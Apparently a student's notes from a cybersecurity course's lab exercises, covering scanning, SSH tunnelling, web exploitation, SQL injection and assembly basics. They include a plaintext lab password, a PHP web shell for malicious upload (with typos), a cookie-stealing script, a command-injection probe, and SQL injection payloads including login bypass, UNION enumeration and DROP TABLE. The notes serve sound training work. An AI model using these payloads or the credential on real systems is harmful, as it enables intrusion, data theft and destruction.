Grey Host Stuff
Stack Number: 4
CTFD Username: MAHI-004-M
Password (Both CTFD and Grey Host): yqSFrkDXseUTqDl
lin.internet: 10.50.23.55  (Grey Host IP)
grey host username: student

FG: https://sec.cybbh.io/public/security/latest/index.html

Scanning Techniques: Host Discovery - Ping
                     Port Enumeration - Nmap ***Dont trust the "Service" part, that could be fake. Banner grab (netcat) to figure out what's actually running
                     Port Interrogation - NetCat

Web Scraping: Method of pulling info from a website (code in scraper.py on Linux OpStation)

Ping Sweep - Code:
                  #!/usr/sbin/python3
                  #Host Discovery
                  for i in {1..254}; do (ping -c1 192.168.28.$i | grep "bytes from" &); done
                  
                  #Port Discovery
                  nmap -Pn -T4 --min-rate=8675309 -sT 192.169.28.1 -p22,80
                  #add --script as needed
                  ssh student@<Grey Host IP> -L<RHP>:<tgt IP>:<tgt port> #The Tunneling method


                  #Port Interrogation
                  nc 192.168.28.1 22
                  *press enter*

Nmap Scripts:
nmap -Pn -T4 -sT --min-rate=6546847 10.50.27.129 -p80 --script=http-enum          ##Tells you about the HTML file
nmap -Pn -T4 -sT --min-rate=6546847 10.50.27.129 -p80 --script=http-robots.txt    ##Tells you about Robots
nmap -Pn -T4 -sT --min-rate=6546847 10.50.27.129 -p80 --script=smb-os-discovery   ##Allows you to pull info from port 445 (smb is only for windows, the apache services are only on linux)

ssh student@<Grey Host IP> -L<RHP>:<tgt IP>:<tgt port> #The Tunneling method

Control Sockets: 
lin-ops> ssh -MS /tmp/gray student@10.50.23.55
*New Window*
lin-ops> ssh -S /tmp/gray dummy

lin-ops> ssh -S /tmp/gray dummy -O forward -L1111:192.168.28.111:80    connect to machine (nothing will happen but port 1111 will be open)
lin-ops> ssh -S /tmp/gray dummy -O forward -L2222:192.168.28.111:8080
lin-ops> ssh -S /tmp/blue smart -O forward -D9050

firefox: 127.0.0.1:1111 To see the website

lin-ops> ssh -S /tmp/gray dummy -O cancel -L2222:192.168.28.111:8080  To cancel the connection to that port (connection is still open)
-------
Web Exploitation: The Hacking part (Less spicy than you think it is)
HTTP Methods: - GET --> Typing into a URL bar
              - POST --> Typing into a box
              - HEAD
              - PUT
wget: wget -r -l2 -P /tmp ftp://ftpserver/ #Do not wget a website
curl: curl -o stuff.html https://web.site/stuff.html

robots.txt: Shows you directories you may not know about -> http(s)://url/robots.txt 
                                                            Any Directories found in this file may be accessible in the url --> localhost:1111/net_test if /net_test was on robots.txt

Exploitation Methods: - Server-Side Injection: Really only gets you /etc/passwd and /etc/hosts files (could find next hop or box from these)
                      - Malicious File Upload: Upload a file that allows you to inject cmds
                        Code of file to upload: <HTML><BODY>         #This code should allow you to run cmds on their site
                                                <FORM METHOD="GET" NAME="myform" ACTION="">
                                                <INPUT TYPE="text" NAME="cmd">
                                                <INPUT TYPE="submit" VALUE="Send">
                                                </FORM>
                                                <pre>
                                                <?php
                                                if($_GET['cmd"]) {
                                                  system($_GE['cmd']);
                                                  }
                                                ?>
                                                </pre>
                                                </BODY></HTML>

                      - Command Injection: Inject cmds to gain access to back-end     ##To find box where you can run cmds, test ";whoami" on every text or input box -- ";" must go before cmd 
                                           cmd to upload is in the pasta on linux
                      - Directory Traversal:
                      - Cross-Site Scripting: <script>alert('meow');</script>  #Dont worry about this one
Cookie Stealing (This will break the website): <?php
                                               $cookie = $_GET["goodz"];
                                               $steal = fopen("/var/www/html/uploads/cookiefile.txt", "a+");
                                               fwrite($steal, $cookie ."\n");
                                               fclose($steal);
                                               ?>
                                               Malicious Injection script is in the spaghetti, just change the ip and port

----------
Day 2 of Web Exploitation
We use MySQL -- Any googling needs to look only at this version of SQL
Demo: cmd to remember --> select * from messages.comments;
      To pad columns in UNION --> select tireid,name,size,cost,5,6 FROM session.Tires UNION SELECT * from session.car;
      To Help: https://sqlbolt.com/
Injection Example: SELECT id FROM users WHERE name=‘tom' OR 1='1’ AND pass=‘tom' OR 1='1’  ##The tom' OR 1='1 is what we put in -- the quotes enable us to inject code ###This is all we can do in a login field
                   SELECT * FROM user WHERE id=‘Johnny'; DROP TABLE Customers; #’  ##Chaining statements together with ";" -- "; #" is at the end to end the query safely
                   UNION SELECT 1,column_name,3 from information_schema.columns where table_name = 'members'  ##Golden Statment -- We will always pull from information_schema.columns ##Always end the statement with ";#"
                   
                   Normal Query to pull expected output: php?item=4
                   Blind injection for validation: php?item=4 OR 1=1  ##No quotes because the input is an integer

                   Passing injection thru url: prices.php?item=4 UNION SELECT 1,2
                                               prices.php?item=4 UNION SELECT 1,2,@@version  ##For Version

      ID Bypass - Login Page: Username: 'OR 1='1
                               Pass: 'OR 1='1
                               f12 --> Network --> Press Login --- A POST Request will be sent, select it, go to Request, copy and paste the RAW to url bar: <url>?<paste>, enter #Turns a POST to GET, gives login info
                               THIS IS ALL YOU CAN GET FROM A LOGIN PAGE

 Gold Statement - UNION SELECT table_schema,2,table_name,column_name,5 FROM information_schema.columns;#
                  UNION SELECT 1,2,3,4,5;#

Union Demo: Steps -  Do something legit and see what happens, does the URL change with variables or does it stay the same?
                     Try to determine what type of action is being done, is it a SELECT, INSERT, UPDATE, etc.
                     Test the variables with some truth logic. Such as using AND 1=1, or OR 1=1, looking for the information for the items is still returned
                     Once the injectable variable is found attach your inject and start enumming. Grab the schema: databases, tables, columns.

Gold.txt {
POST REQUESTS -- These go into text box

UNION SELECT table_schema,2,table_name,column_name,5 FROM in
formation_schema.columns;#

UNION SELECT 1,2,3,4,5;#

Audi'UNION SELECT tireid,2,name,cost,size FROM session.Tires;#


GET REQUESTS -- These go into url

Selection=2 UNION SELECT 1,2,3;#

Selection=2 UNION SELECT table_schema,column_name,table_name FROM information_schema.columns;#

Selection=2 UNION SELECT carid,year,name FROM session.car;#
}

---------------
Reverse Engineering
Words to Know: Heap - A "Heap" of memory to be allocated for use
               Stack - Contiguous section of memory (Think a rifle magazine) to be used, generally for arguments
               GENERAL REGISTER - A multipurpose register that can be used by either programmer or user to store data or a memory location address
               CONTROL REGISTER - A processor register that changes or controls the behavior of a CPU
               FLAGS REGISTER - Contains the current state of the processor               

Common Instruction Pointers: 
MOV - move source to destination
PUSH - push source onto stack
POP - Pop top of stack to destination
INC - Increment source by 1\
DEC - Decrement source by 1
ADD - Add source to destination
SUB - Subtract source from destination
CMP - Compare 2 values by subtracting them and setting the %RFLAGS register. ZeroFlag set means they are the same.
JMP - Jump to specified location
JLE - Jump if less than or equal
JE - Jump if equal












           ASD
